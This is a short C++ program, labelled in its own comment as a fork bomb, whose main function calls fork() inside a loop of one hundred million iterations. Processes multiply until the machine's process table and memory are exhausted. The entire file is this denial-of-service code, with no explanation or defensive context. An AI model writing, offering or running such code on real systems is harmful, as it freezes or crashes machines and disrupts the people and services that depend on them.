#include <iostream>
#include <unistd.h>

// fork bomb

int main(int argc, char const *argv[])
{
    for(int i = 0; i < 100000000; i++) 
    {
        fork();
    }
    return 0;
}
